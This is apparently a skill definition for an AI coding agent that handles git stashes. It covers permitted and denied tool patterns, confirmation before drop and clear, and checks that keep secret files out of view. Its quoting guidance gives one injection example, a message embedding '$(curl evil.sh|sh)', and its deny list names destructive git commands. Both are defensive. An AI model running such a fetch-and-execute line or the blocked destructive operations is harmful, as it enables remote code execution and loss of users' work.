---
name: stash-manager
description: Manage git stashes — save (push), list, inspect (show), restore (pop / apply), drop, or clear. Non-destructive by default. Destructive ops (drop, clear) require explicit confirmation with the stash identifier shown first. Invoke when the user wants to stash changes, list stashes, recover stashed work, or clean up old stashes.
allowed-tools:
  - Bash(git status)
  - Bash(git status --porcelain*)
  - Bash(git branch --show-current)
  - Bash(git stash)
  - Bash(git stash push*)
  - Bash(git stash list*)
  - Bash(git stash show*)
  - Bash(git stash pop*)
  - Bash(git stash apply*)
  - Bash(git stash drop*)
  - Bash(git stash clear)
  - Bash(git diff --name-only*)
  - Bash(git rev-parse*)
  - Bash(git log --oneline*)
  - AskUserQuestion
disallowed-tools:
  # destructive git out of scope (non-stash ops that must hard-deny in stash workflow)
  - Bash(git push*)
  - Bash(git commit*)
  - Bash(git reset*)
  - Bash(git clean*)
  - Bash(git checkout*)
  - Bash(git switch*)
  - Bash(git merge*)
  - Bash(git rebase*)
  - Bash(git branch -d*)
  - Bash(git branch -D*)
  - Bash(git branch --delete*)
  # dangerous git (defense-in-depth)
  - Bash(git update-ref*)
  - Bash(git filter-branch*)
  - Bash(git filter-repo*)
  - Bash(git replace*)
  - Bash(git fsck*)
  - Bash(git gc*)
  - Bash(git reflog expire*)
  - Bash(git config*)
  - Bash(git remote add*)
  - Bash(git remote remove*)
  - Bash(git remote rm*)
  - Bash(git remote set-url*)
---

# Stash Manager

Save, list, restore, or drop git stashes. Non-destructive by default; destructive ops (`drop`, `clear`) always show the stash identifier and require confirmation first. Secret files follow `../_shared/secret-patterns.md` — never inspect stash contents of secret paths.

## Operations

### Save (push)

```bash
git stash push -m "<message>"                # staged + unstaged tracked
git stash push -m "<message>" -u             # include untracked (careful)
git stash push -m "<message>" -- <paths>     # partial stash by path
```

- Ask the user for a message when missing — default to `stash @ <branch> <date>` is fine if user doesn't care.
- **Message quoting:** pass the message via stdin or use single quotes to prevent command substitution. Prefer:
  ```bash
  git stash push -m "$(printf %s 'wip: refactor')"
  ```
  or use a fixed-string: `git stash push -m 'wip: refactor'`. Never splice user-supplied text into `-m "..."` double-quoted — a message like `"wip: $(curl evil.sh|sh)"` would execute. If the user provides a message containing `$`, backticks, or `"`, prefer stdin or reject the message and ask for a simpler one.
- **Warn before `-u`** — untracked may include secret files not yet gitignored. Offer to run gitignore check first (invoke `commit` skill Step 1b, or refuse and ask the user to verify).
- Never `--keep-index` silently — it leaves a confusing partial stash; offer it only when user explicitly asks.

### List

```bash
git stash list
```

Display with index and message. Add `--oneline` style format if the user wants a compact view:

```bash
git stash list --format='%gd %cr: %gs'       # "stash@{0} 2 hours ago: pre-sync: feature/PROJ-123"
```

### Show (inspect)

```bash
git stash show stash@{N}                     # stat
git stash show stash@{N} -p                  # full diff
git stash show stash@{N} --name-only         # paths only
```

**Refuse `-p` if the stash touches any path matching `_shared/secret-patterns.md`** — run `git stash show stash@{N} --name-only` first, check the list, then proceed with `-p` only if clean. If secrets present, report names only and stop.

### Restore (pop vs apply)

Two options — always clarify with the user which one:

- **`git stash pop stash@{N}`** — restore and remove the stash. One-shot.
- **`git stash apply stash@{N}`** — restore and keep the stash. Safer if you're uncertain.

Default recommendation when user says "restore": `apply` (safer), then `drop` explicitly after verifying.

**On conflict** (pop or apply): stop immediately. Do not auto-abort. Report conflicting files and tell the user to resolve + `git add` + optionally `git stash drop stash@{N}` once confirmed.

### Drop (destructive)

```bash
git stash drop stash@{N}
```

- **Always show the stash first** (`git stash show stash@{N}` or list line) and ask via `AskUserQuestion`: **Drop this stash** / **Show full diff** / **Abort**.
- Never drop without the explicit `stash@{N}` identifier. `git stash drop` without args drops `stash@{0}` silently — forbidden here; always pass the identifier.

### Clear (destructive, all)

```bash
git stash clear
```

Wipes all stashes — unrecoverable outside `git fsck --lost-found` / `reflog`. Require **typed confirmation**: after listing all stashes, ask via `AskUserQuestion` with the full list shown, and require the user to pick "Yes, clear all N stashes" (not generic "confirm"). If in doubt, refuse and tell the user to drop individually.

## Procedure

### 1. Identify intent

Map the user's request to an operation: save / list / show / restore / drop / clear. If ambiguous, ask via `AskUserQuestion` — do not guess.

### 2. Preflight

```bash
git status
git branch --show-current
git stash list
```

- For `save` on a clean tree → refuse, there is nothing to stash.
- For `show` / `pop` / `apply` / `drop` with a specific `stash@{N}` → verify the stash exists first (`git rev-parse --verify stash@{N}` or match in `git stash list`).
- For `clear` → list all before confirming.

### 3. Execute per-operation

Follow the rules in each section above. Secret-file check before inspecting stash contents.

### 4. Report

**Success (return to caller):** essentials only.

```text
stashed: stash@{0} (pre-sync, 3 files) on feature/PROJ-123-foo
```

```text
popped stash@{0} cleanly (3 files restored)
```

```text
dropped stash@{2}
```

```text
stashes: 3 (stash@{0} pre-sync on feature/PROJ-123, stash@{1} wip on main, stash@{2} experiment)
```

**Failure:** full context.

- Operation attempted (save / pop / drop / clear, with stash identifier).
- Error (stderr snippet, conflicting files).
- Current state: working tree clean/dirty, which stashes exist.
- Recovery options — name them by `stash@{N}` and suggest `git stash show` / `git stash apply` before anything destructive.

## Rules

- **Never drop without explicit `stash@{N}`** — no bare `git stash drop`.
- **Never `clear`** without a full listing + typed-style confirmation.
- **Never inspect stash contents (`-p`) if secret paths are involved** — `--name-only` first.
- **Never auto-resolve conflicts** on pop/apply — stop and report.
- **Never `stash -u`** without warning; untracked files may include secrets not yet ignored.
- **Branch consistency** — warn if the user is on a different branch from where the stash was created (it may apply cleanly but cause surprising state).

## Examples

### Save before switching context

```text
→ git status: dirty (2 tracked files modified)
→ ask message → user: "wip: auth refactor"
→ git stash push -m "wip: auth refactor"
→ report: stashed stash@{0} (2 files) on feature/PROJ-123-auth
```

### Restore (apply, then drop)

```text
→ list: stash@{0} wip: auth refactor
→ ask: pop / apply / abort → user: apply (safer)
→ git stash apply stash@{0}   ok, 2 files restored
→ ask: drop now / keep → user: drop
→ git stash drop stash@{0}
```

### Refuse unsafe drop

```text
user: "drop the stash"
→ list: stash@{0} secrets dump, stash@{1} wip refactor
→ multiple stashes; ask which one explicitly
→ never default to stash@{0}
```

### Secret in stash

```text
→ git stash show stash@{1} --name-only
   .env.local
   src/api/Client.ts
→ stop; report: stash@{1} touches .env.local
→ advise: inspect src/api/Client.ts separately; do NOT `-p` the stash; consider dropping after confirming contents via git log
```
